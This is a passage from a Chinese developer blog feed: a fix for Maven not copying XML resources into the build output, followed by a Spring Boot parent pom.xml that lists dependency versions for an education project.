java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//原因：xml文件没有发布到 target下</span></span><br><span class="line"></span><br><span class="line">解决方案：</span><br><span class="line"><span class="number">1</span>. 将logback-spring.xml 文件复制到 target文件夹下</span><br><span class="line"> </span><br><span class="line"><span class="number">2</span>. 在maven 文件中加入配置，若仍不行。IDEA--&gt;build--&gt;build project</span><br><span class="line">    &lt;!-- mapper.xml文件在java目录下 --&gt;</span><br><span class="line">            &lt;resource&gt;</span><br><span class="line">                &lt;directory&gt;src/main/java&lt;/directory&gt;</span><br><span class="line">                &lt;includes&gt;</span><br><span class="line">                    &lt;include&gt;**<span class="comment">/*.xml&lt;/include&gt;</span></span><br><span class="line"><span class="comment">                &lt;/includes&gt;</span></span><br><span class="line"><span class="comment">            &lt;/resource&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">            &lt;!-- mapper.xml文件在resources目录下--&gt;</span></span><br><span class="line"><span class="comment">            &lt;resource&gt;</span></span><br><span class="line"><span class="comment">                &lt;directory&gt;src/main/resources&lt;/directory&gt;</span></span><br><span class="line"><span class="comment">                &lt;includes&gt;</span></span><br><span class="line">                    &lt;include&gt;**/*.xml&lt;/include&gt;</span><br><span class="line">                    &lt;include&gt;**<span class="comment">/*.properties&lt;/include&gt;</span></span><br><span class="line"><span class="comment">                &lt;/includes&gt;</span></span><br><span class="line"><span class="comment">            &lt;/resource&gt;</span></span><br><span class="line"><span class="comment">        &lt;/resources&gt;</span></span><br></pre></td></tr></table></figure><p>![image-20200627181629722](X:\Users\xu\Application Data\XMind\workspace-cathy.temp-attachments\attachments\Spring Boot.assets\image-20200627181629722.png)</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>&lt;font color=#0099ff size=6 face=&quot;STCAIYUN&quot;&gt;常用配置&lt;/font&gt;</title>
      <link href="2020/08/28/%E5%B8%B8%E7%94%A8%E9%85%8D%E7%BD%AE/"/>
      <url>2020/08/28/%E5%B8%B8%E7%94%A8%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="一-pom文件"><a href="#一-pom文件" class="headerlink" title="一. pom文件"></a>一. pom文件</h1><h3 id="1-1-spring-boot"><a href="#1-1-spring-boot" class="headerlink" title="1.1 spring boot"></a>1.1 spring boot</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modules</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">module</span>&gt;</span>service<span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">module</span>&gt;</span>common<span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">modules</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.1.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.aliyun<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xw_edu<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>父<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>父模块<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">guli.version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">guli.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mybatis-plus.version</span>&gt;</span>3.0.5<span class="tag">&lt;/<span class="name">mybatis-plus.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">velocity.version</span>&gt;</span>2.0<span class="tag">&lt;/<span class="name">velocity.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">swagger.version</span>&gt;</span>2.7.0<span class="tag">&lt;/<span class="name">swagger.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aliyun.oss.version</span>&gt;</span>2.8.3<span class="tag">&lt;/<span class="name">aliyun.oss.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">jodatime.version</span>&gt;</span>2.10.1<span class="tag">&lt;/<span class="name">jodatime.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">poi.version</span>&gt;</span>3.17<span class="tag">&lt;/<span class="name">poi.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">commons-fileupload.version</span>&gt;</span>1.3.1<span class="tag">&lt;/<span class="name">commons-fileupload.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">commons-io.version</span>&gt;</span>2.6<span class="tag">&lt;/<span class="name">commons-io.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">httpclient.version</span>&gt;</span>4.5.1<span class="tag">&lt;/<span class="name">httpclient.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">jwt.version</span>&gt;</span>0.7.0<span class="tag">&lt;/<span class="name">jwt.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aliyun-java-sdk-core.version</span>&gt;</span>4.3.3<span class="tag">&lt;/<span class="name">aliyun-java-sdk-core.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aliyun-sdk-oss.version</span>&gt;</span>3.1.0<span class="tag">&lt;/<span class="name">aliyun-sdk-oss.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aliyun-java-sdk-vod.version</span>&gt;</span>2.15.2<span class="tag">&lt;/<span class="name">aliyun-java-sdk-vod.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aliyun-java-vod-upload.version</span>&gt;</span>1.4.11<span class="tag">&lt;/<span class="name">aliyun-java-vod-upload.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aliyun-sdk-vod-upload.version</span>&gt;</span>1.4.11<span class="tag">&lt;/<span class="name">aliyun-sdk-vod-upload.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">fastjson.version</span>&gt;</span>1.2.28<span class="tag">&lt;/<span class="name">fastjson.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">gson.version</span>&gt;</span>2.8.2<span class="tag">&lt;/<span class="name">gson.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">json.version</span>&gt;</span>20170516<span class="tag">&lt;/<span class="name">json.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">commons-dbutils.version</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">commons-dbutils.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">canal.client.version</span>&gt;</span>1.1.0<span class="tag">&lt;/<span class="name">canal.client.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">docker.image.prefix</span>&gt;</span>zx<span class="tag">&lt;/<span class="name">docker.image.prefix</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">cloud-alibaba.version</span>&gt;</span>0.2.2.RELEASE<span class="tag">&lt;/<span class="name">cloud-alibaba.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--Spring Cloud--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-dependencies<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>Hoxton.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">type</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">scope</span>&gt;</span>import<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-alibaba-dependencies<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;cloud-alibaba.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">type</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">scope</span>&gt;</span>import<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--mybatis-plus 持久层--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.baomidou<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-plus-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;mybatis-plus.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">&lt;!-- velocity 模板引擎, Mybatis Plus 代码生成器需要 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.velocity<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>velocity-engine-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;velocity.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">&lt;!--swagger--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.springfox<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>springfox-swagger2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;swagger.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--swagger ui--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.springfox<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>springfox-swagger-ui<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;swagger.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">&lt;!--aliyunOSS--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.aliyun.oss<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aliyun-sdk-oss<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;aliyun.oss.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">&lt;!--日期时间工具--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>joda-time<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>joda-time<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;jodatime.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">&lt;!--xls--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.poi<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>poi<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;poi.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--xlsx--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.poi<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>poi-ooxml<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;poi.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">&lt;!--文件上传--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-fileupload<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-fileupload<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;commons-fileupload.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">&lt;!--commons-io--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;commons-io.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">&lt;!--httpclient--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.httpcomponents<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>httpclient<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;httpclient.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.google.code.gson<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>gson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;gson.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">&lt;!-- JWT --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.jsonwebtoken<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jjwt<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;jwt.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">&lt;!--aliyun--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.aliyun<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aliyun-java-sdk-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;aliyun-java-sdk-core.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.aliyun.oss<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aliyun-sdk-oss<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;aliyun-sdk-oss.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.aliyun<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aliyun-java-sdk-vod<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;aliyun-java-sdk-vod.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.aliyun<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aliyun-java-vod-upload<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;aliyun-java-vod-upload.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.aliyun<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span 